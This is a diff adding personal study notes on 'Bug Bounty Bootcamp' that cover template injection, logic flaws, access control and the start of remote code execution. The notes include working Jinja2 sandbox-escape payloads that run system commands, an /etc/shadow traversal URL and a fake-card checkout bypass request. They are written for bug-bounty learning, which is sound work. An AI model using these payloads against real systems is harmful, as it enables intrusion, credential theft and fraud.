@@ -20,6 +20,9 @@
 - [Chapter 13: Server-Side Request Forgery](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-13-server-side-request-forgery)
 - [Chapter 14: Insecure Deserialization](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-14-insecure-deserialization)
 - [Chapter 15: XML External Entity](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-15-xml-external-entity)
+- [Chapter 16: Template Injection](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-16-template-injection)
+- [Chapter 17: Application Logic Errors and Broken Access Control](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-17-application-logic-errors-and-broken-access-control)
+- [Chapter 18: Remote Code Execution](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-18-remote-code-execution)
 
 ### Chapter 1: Picking a Bug Bounty Program
 
@@ -3628,5 +3631,355 @@ print(tmpl.render(
 - Sanitize user input before embedding it into web templates and avoid injecting user-supplied data into templates whenever possible.
 
 **Hunting for Template Injection**
+
+"As with hunting for many other vulnerabilities, the first step in finding template injections is to identify locations in an application that accept input."
+
+_Step 1: Look for User-Input Location_
+
+- Places to look: URL paths, parameters, fragments, HTTP request headers and body, file uploads, etc.
+- Applications often use template engines to generate customized email or home pages based on the user's information.
+  - Look for endpoints that accept user input that will eventually be displayed back to the user.
+- Template injection endpoints and XSS endpoints are the same or similar, use the strategy outlind in Chapter 6 to identify candidates.
+
+_Step 2: Detect Template Injection by Submitting Test Payloads_
+
+- Inject a test string into noted Endpoints.
+  - ex. `{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]`
+  - This test string is good at inducing errors in popular template engines.
+  - `${...}` is the special syntax for expressions in FreeMarker and Thymeleaf Java templates.
+  - `{{...}}` is the syntax for expressions in PHP templates such as Smarty and Twig, as well as Python templates like Jinja2.
+  - `<%=...%>` is the syntax for the Embedded Ruby Template (EBR).
+  - `[*random expression*]` makes the server interpret the random expression as a list item if the user input is placed into an expression tag within the template.
+  - `abcxx` is used to make the template engine resolve the variable with the name abcxx, which hopefully hasn't been defined in the application.
+  - If you get an error from this payload, it means the special characters are being treated as special by the template engine and indicates a template injection vulnerability.
+  - Further test for a vuln by providing input that the template engine can successful resolve:
+    - `{{7*7}}` or `${7*7}` or `<%=7*7%>`
+    - If any of these return 49, it means the data is being interpreted as code by the template engine.
+    - Use the results from the first test string to decide which to use, or use all 3 separately to see what happens.
+  - Note that these payloads may not be displayed immediately, or they may be displayed somewhere else (future web pages, emails, and files).
+    - ex. if an application renders an input field unsafely when generating a bulk email, you will need to look at the generated email to check whether your attack has succeeded.
+- Testing the logic of the application:
+  - ex. The three test payloads `{{7*7}}` or `${7*7}` or `<%=7*7%>` work with this code snipped:
+    ```
+    from jinja2 import Template
+    tmpl = Template("
+    <html><h1>The user's name is: " + user_input + "</h1></html>")print(tmpl.render())
+    ```
+  - ex. If the user input is concatenated into the template as a part of the template's logic:
+    ```
+    from jinja2 import Template
+    tmpl = Template("
+    <html><h1>The user's name is: {{" + user_input + "}}</h1></html>")print(tmpl.render())
+    ```
+    - Here the user input is placed into the template within expression tags `{{...}}`.
+      - Because of this, you will need to remove the `{{}}` around your payload to see if the input will execute as code.
+
+_Step 3: Determine the Template Engine in Use_
+
+- If your test payload caused an error, the error message itself may contain the name of the template engine.
+  `jinja2.exceptions.UndefinedError: 'abcxx' is undefined.`
+- If this didn't produce a descriptive error like the one above, you can test the application specific payloads `{{7*7}}` or `${7*7}` or `<%=7*7%>`.
+  - As these correspond to the different engines we described above, whichever one works will narrow down what engine is in use, or at least what language is in use. All you need to know is what language to write your payload in.
+- Getting clever: You could also use a test payload like `{{7*'7'}}` which will return `7777777` in Jinja2 and 49 in twig.
+- [PortSwigger payloads](https://portswigger.net/research/server-side-template-injection) for more info and payloads.
+
+**Escalating the Attack**
+
+- Using the `7*7` examples from before are usually enough to prove a template injection to security teams.
+  - Escalating from this point can help to show the severity of the bug and possibly lead to a higher payout.
+- Escalating to show the execution of system commands can be a significant upgrade.
+  - If you can execute arbitrary system commands and read the `/etc/shadow` file, you could then cracked the hashed passwords there and possibly get access to a sys admin account.
+
+_Searching for System Access via Python Code_
+
+- In python, you can execute system commands via the `os.system()` function from the `os` module.
+  - ex. `os.system(ls)` to list the contents of the current directory.
+- If the python application hasn't imported the os module, and you send a request like:
+  ```
+  GET /display_name?name={{os.system('ls')}}
+  Host: example.com
+  ```
+  - You will most likely get the error: `jinja2.exceptions.UndefinedError: 'os' is undefined`
+  - You can import modules using the syntax: `import MODULE` or `from MODULE import *` or `__import__('MODULE')`
+  - Trying to import a module from the template engine like the following example will also probably not work:
+    ```
+    GET /display_name?name="{{__import__('os').system('ls')}}"
+    Host: example.com
+    ```
+    - This will most likely produce the error: `jinja2.exceptions.UndefinedError: '__import__' is undefined`
+    - Most template engines block dangerous functionalities like `import` or make an allowlist that allows users to perform only certain operations within the template.
+    - However, you may be able to escape these sandboxed environments - demonstrated in the next section.
+
+_Escaping the Sandbox by Using Python Built-in Functions_
+
+"...When you're barred from importing certain useful modules or importing anything at all, you need to investigate functions that are already imported by Python by default. Many of these built-in functions are integrated as a part of Python's `object class`, meaning that when we want to call these functions, we can create an object and call the functions as a method of that object. For example, the following GET request contains Python code that lists the Python classes available:"
+
+```
+GET / display_name?name="{{[].__class__.__bases__[0].__subclasses__()}}"
+Host: example.com
+```
+
+- Breaking it down:
+- `[].__class__`: Creates an empty list and calls its `__class__` attribute, which refers to the class the instance belongs to, list.
+- `[].__class__.__bases__`: Uses the `__bases__` attribute to refer to the base classes of the list class.
+- `[].__class__.__bases__[0]`: Returns a tuple of all the base classes of the class list.
+  - A `base class` is a class taht the current class is built from; `list` has a base class called `object`.
+  - We access the `object` class by referring to the first item in the tuple `[0]`.
+- `[].__class__.__bases__[0].__subclasses__()`: `__subclasses__` is used to refer to all the subclasses of the class.
+- When you submit this payload into the template injection endpoint, you should see a list of classes like this:
+  ```
+  [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, class 'list'>,...]
+  ```
+- When we use this method, all the subclasses of the `object` class become accessible to us.
+  - The next step is to look for a method in one of these classes that we can use for command execution.
+  - Not all application's Python environments wil have the same classes.
+  - Some payloads will work on some applications but not on others. You'll have to try different ones until you see success.
+- The `__import__` function is blocked by Jinja2, so we will need to access it via the `builtins` module.
+  - `builtins` module provides direct access to all of Python's built-in classes and functions.
+  - Most Python modules hae `__builtins__` as an attribute that refers to the built-in module, so you can recover the `builtins` module by referring to the `__builtins__` attribute.
+- Within all the subclasses listed in `[]/__class__.__bases__[0].__subclasses__()`, there is a class named `catch_warnings` that we can build an exploit around.
+  - To find the `catch_warnings` subclass, or to ensure it's there, you can inject the following loop into the template code:
+  ```
+  {% for x in [].__class__.__bases__[0].__subclasses__() %}     #Loops through the list of available classes.
+  {% if 'catch_warnings' in x.__name__ %}                       #Finds the class matching the string `catch_warnings`
+  {{x()}}                                                       #Instantiates an object of that class.
+  {%endif%}
+  {%endfor%}
+  ```
+  - Objects of the class `catch_warnings` have an attribute called `_module` that refers to the `warnings` module.
+  - We use the reference to the module to refer to the `builtins` module:
+  ```
+  {% for x in [].__class__.__bases__[0].__subclasses__() %}
+  {% if 'catch_warnings' in x.__name__ %}
+  {{x()._module.__builtins__}}
+  {%endif%}
+  {%endfor%}
+  ```
+  - This should return a list of built-in classes and functions, including the function `__import__`:
+  ```
+  {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the 'nil' object: Ellipsis represents '...' in slices.", '__package__':'', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, ...}
+  ```
+  - You can see the last entry before we cut it off that we have access to the import functionality this way.
+- Since built-in classes and functions are stored in a Python dictionary, you can access the `__import__` function by referring to the key of the function's entry in the dictionary:
+  ```
+  {% for x in [].__class__.__bases__[0].__subclasses__() %}
+  {% if 'catch_warnings' in x.__name__ %}
+  {{x()._module.__builtins__['__import__']}}
+  {%endif%}
+  {%endfor%}
+  ```
+  - Now we can use the `__import__` function to import the `os` module:
+  ```
+  {% for x in [].__class__.__bases__[0].__subclasses__() %}
+  {% if 'catch_warnings' in x.__name__ %}
+  {{x()._module.__builtins__['__import__']('os')}}
+  {%endif%}
+  {%endfor%}
+  ```
+  - Lastly, call the `system()` function and put the command we want to execute as the `system()` function's argument:
+  ```
+  {% for x in [].__class__.__bases__[0].__subclasses__() %}
+  {% if 'catch_warnings' in x.__name__ %}
+  {{x()._module.__builtins__['__import__']('os').system('whoami')}}
+  {%endif%}
+  {%endfor%}
+  ```
+  - If all works as it should, you can now execute arbitrary system commands.
+
+_Submitting Payloads for Testing_
+
+- A common way of proving you've achieved command execution and gained access to the operating system is to create a file with a unique name like "template_injection_by_YOUR_BUG_BOUNTY_USERNAME.txt"
+
+  ```
+  {% for x in [].__class__.__bases__[0].__subclasses__() %}
+  {% if 'catch_warnings' in x.__name__ %}
+  {{x()._module.__builtins__['__import__']('os').system('touch template_injection_by_YOU')}}
+  {%endif%}
+  {%endfor%}
+  ```
+
+- Resources for learning more about sandbox escapes:
+  - [CTF Wiki](https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape)
+  - [HackTricks](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes/) - HackTricks is an amazing resource in general.
+  - [Programmer Help](https://programmer.help/blogs/python-sandbox-escape.html)
+
+**Automating Template Injection**
+
+- A tool built to automate the template injection process: [tplmap](https://github.com/epinna/tplmap/).
+  - This tool can scan for template injections, determine the template engine in use, and construct exploits.
+  - Does not support every template engine.
+
+**Finding Your First Template Injection**
+
+1. Identify an opportunity to submit user input to the application. Mark down candidates of template injection for further inspection.
+2. Detect template injection by submitting test payloads. You can use either payloads that are designed to induce errors, or engine-specific payloads designed to be evaluated by the template engine.
+3. If you find an endpoint that is vulnerable to template injection, determine the template engine in use. This will help you build an exploit specific to the template engine.
+4. Research the template engine and programming language that the target is using to construct an exploits.
+5. Try to escalate the vulnerability to arbitrary command execution.
+6. Create a proof of concept that does not hard the targeted system. A good way to do this is to execute `touch template_injection_by_YOU.txt` to create a specific proof-of-concept file.
+7. Do a report.
+
+[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
+
+### Chapter 17: Application Logic Errors and Broken Access Control
+
+"Application logic errors and broken access control vulnerabilities are quite different from those we've discussed so far. Most of the vulnerabilities covered in previous chapters are caused by faulty input validation: they happen when polluted user input is processed without proper sanitization. These malicious inputs are syntactically different from normal user input and are designed to maniplate application logic and cause damage to the application or its users."
+
+- Application logic errors and broken access control issues are often triggered by perfectly valid HTTP requests containing no illegal or malformed character sequences.
+  - Still, these requests are crafted intentionally to misuse the application's logic for malicious purposes or circumvent the application's access control - Soooo still illegal...
+- Application logic errors are logic flaws in the application.
+- Broken access control occurs when sensitive resources or functionality are not properly protected.
+  - Both generally require more creativity and intuition than technical knowledge.
+
+**Application Logic Errors**
+
+- Also referred to as _business logic vulnerabilities_.
+  - They use legitimate logic flow of the application to the result of negative consequences for the organization.
+- ex. _Multifactor Authentication_
+  - Forms of multifactor authentication: phone number to authenticate with (text or call), email authentication, authentication app, physical key, biometrics.
+  - Can be vulnerable to what the author calls "_skippable authentication step_" that allows users to skip a step of the authentication process.
+  - ex. 3-step authentication process: Step 1: (password check), Step 2: (MFA), Step 2: (Security Question).
+    - Normal authentication flow:
+    1. The user visits `https://example.com/login/`. The application prompts the user for their password, and the user enters it.
+    2. If the password is correctly entered, the application sends an MFA code to the user's email address and redirects the user to `https://example.com/mfa/`. The user enters their MFA code.
+    3. The application checks the MFA code, and if it's correct, redirects to `https://example.com/security_questions/.` The user then answers security questions provided by the application. If successful, the user is logged in.
+    - You may be able to request the final step to bypass steps 1 and 2.
+    - You may be able to bypass step 2 after completing step 1.
+- ex. _Multi-step checkout process_
+
+  - When users save a new payment method, the site will verify whether the credit card is valid and current. That way, when the user submits an order via a saved payment method, the application won't have to verify it again.
+  - ex. POST request to submit the order with a saved payment method:
+    - payment method is pre-verified, verification not done at time or checkout.
+
+  ```
+  POST /new_order
+  Host: shop.example.com
+
+  (POST request Body)
+  item_id=123
+  &quantity=1
+  &saved_card=1
+  &payment_id=1
+  ```
+
+  - ex. POST request to submit order with new payment method:
+    - payment method is verified at time of checkout.
+
+  ```
+  POST /new_order
+  Hst: shop.example.com
+
+  (POST request Body)
+  item_id=123
+  &quantity=1
+  &card_number=1234-1234-1234-1234
+  ```
+
+  - In these examples, the payment method is only verified if the customer is using a new payment method.
+  - The application determines whether the payment method is new by the existence of the `saved_card` parameter in the HTTP request.
+  - So a malicious user can submit a request with a `saved_card` parameter _and_ a fake credit card number, resulting in fraudulent purchases using an unverified card:
+
+  ```
+  POST /new_order
+  Host: shop.example.com
+
+  (POST request Body)
+  item_id=123
+  &quantity=1
+  &saved_card=1
+  &card_numer=0000-0000-0000-0000
+  ```
+
+  - These application logic errors are prevalent because they cannot be scanned for automatically, they manifest is too many ways, and most current vulnerability scanners don't have the intelligence to understand application logic or business requirements.
+
+**Broken Access Control**
+
+- The previous example could also be considered a broken access control issue.
+
+_Exposed Admin Panels_
+
+- Applications sometimes neglect or forget to secure sensitive functionalities like admin panels used to monitor the application, or believe that these admin panels are secure because they're hidden (not so hidden) behind obscure URLs or ports.
+  - ex. `https://example.com/YWRtaW4/admin.php`: But this could still be found through google dorking or URL brute-forcing.
+  - ex. The admin panel is properly secure so that only those with valid admin creds can access it, but if the request is coming from an internal IP that the application trusts, the admin panel won't ask for authentication.
+    - If an attacker can find an SSRF vuln, they could bypass authentication.
+  - ex. Attackers could bypass access control by tampering with cookies or request headers if they're predictable.
+    - You may be able to bypass access control by providing a cookie like `admin=1` in your HTTP request.
+  - ex. You may be able to browse past the access control point.
+    - The admin panel login is located at `https://example.com/YWRtaW4/admin.php`, which will ask you to authenticate, but you may be able to browse directly to `https://example.com/YWRtaW4/dashboard.php`, bypassing the login screen.
+- All of these suggestions seem very unlikely in today's landscape, but hey, worth a shot!
+
+_Directory Traversal Vulnerabilities_
+
+"_Directory traversal vulnerabilities_ are another type of broken access control. They happen when attackers can view, modify, or execute files they shouldn't have access to by manipulating filepaths in the user-input fields."
+
+- ex. Browsing to `https://example.com/uploads?file=example.jpeg` will cause the app to display the file named example.jpeg in the users uploads folder located at `/var/www/html/uploads/USERNAME`.
+  - If not properly sanitized, the user could access other system files through using ../../../FILE_NAME.
+  - ex. `https://example.com/uploads?file=../../../../../../../../etc/shadow`
+- Not in the book: I've use directory traversals to achieve a reverse shell by dropping a reverse shell payload in the uploads folder, then browsing to the file in the browser to trigger the payload. The `www` user will almost never have the privileges to be able to access `/etc/shadow` but you could get the `www` user to connect back to you so you can escalate privileges from a reverse shell.
+
+**Prevention**
+
+"You can prevent application logic errors by performing tests to verify that the application's logic is working as intended. This is best done by someone who understands both the business requirements of the organization and the development process of the application. You'll need a detailed understanding of how your application works, how users interact with each other, how functionalities are carried out, and how complex processes work."
+
+- Implement granular access control policies on all files and actions on a system.
+  - The code that implements the access control policies should also be audited for potential bypasses.
+- Conduct penetration tests to find holes in the access policy or its implementation.
+- Ensure access control policies are accurate.
+- Make sure that all the ways of accessing a service have consistent access control mechanisms.
+  - It shouldn't matter if the app is accessed via a mobile device, desktop device, or API endpoint.
+  - The same requirements, such as MFA, should apply for everyone individual access point.
+
+**Hunting for Application Logic Errors and Broken Access Control**
+
+"Application logic errors and access control issues are some of the easiest bugs for beginners to find. Hunting for these vulnerabilities doesn't involve tampering with code or crafting malicious inputs; instead, it requires creative thinking and a willingness to experiment."
+
+_Step 1: Learn About Your Target_
+
+- As usual, browse the target application as a regular user to uncover functionalities and interesting features.
+- Read the application's engineering blogs and documentation, the more you understand about the architecture, dev process, and business needs/model, the easier it will be to spot vulnerabilities.
+- New features are juicy targets for testing.
+- Find our about the architecture and look for known vulnerabilities
+  - Check if anything is outdated.
+
+_Step 2: Intercept Requests While Browsing_
+
+- Use a proxy to track the process of what requests are sent while interacting with specific features.
+- Take note of how sensitive functionalities and access control are implemented, and how they interact with client requests.
+  - Does the new payment option have request parameters that indicate the payment type or how much will be charged? Mess with these values.
+- When accessing the admin portal, are any special HTTP headers or parameters sent?
+
+_Step 3: Think Outside the Box_
+
+- Mess with values, add parameters you think might exist but aren't included in the requests, can you combine parameters that usually only occur separately, can you switch payment type to a gift card? Get creative.
+
+**Escalating the Attack**
+
+- Try to combine the application logic error or broken access control with other vulnerabilities to increase impact.
+- If you can find the configuration files or tech stack, search for CVEs that pertain to the software version in use.
+- Think of what an attacker could do with the vulnerabilities you find, then try to exploit them (just make sure you don't do any damage).
+
+**Finding Your First Application Logic Error or Broken Access Control**
+
+1. Learn about your target application. The more you understand about the architecture and development process of the web application, the better you'll be at spotting these vulnerabilities.
+2. Intercept requests while browsing the site and pay attention to sensitive functionalities. Keep track of every request sent during these actions.
+3. Use your creativity to think of ways to bypass access control or otherwise interfere with application logic.
+4. Think of ways to combine the vulnerability you've found with other vulnerabilities to maximize the potential impact of the flaw.
+5. Draft your report.
+
+Note: This chapter seems pretty light it comparison to the last. There is a lot of stuff that can be done with broken access control and application logic errors. They are some of the move prevalent vulnerabilities out there according to the OWASP top 10. I would say this chapter doesn't capture the tip of the iceberg.
+
+[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
+
+### Chapter 18: Remote Code Execution
+
+"\*Remote code execution (RCE) occurs when an attacker can execute arbitrary code on a target machine because of a vulnerability or misconfiguration. RCEs are extremely dangerous, as attackers can often ultimately compromise the web application or even the underlying web server."
+
+- RCE can be achieve through various techniques: SQL injection, Insecure Deserialization, Template Injection, etc.
+
+**Mechanisms**
+
+"Sometimes attackers can achieve RCE by injecting malicious code directly into executed code. These are _code injection vulnerabilities_. Attackers can also achieve RCE by putting malicious code into a file executed or included by the victim application, vulnerabilities called _file inclusions_" - I was writing about file inclusions in the last chapter when I mentioned how to get a reverse shell.
+
+**Code Injection**
 
 [Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
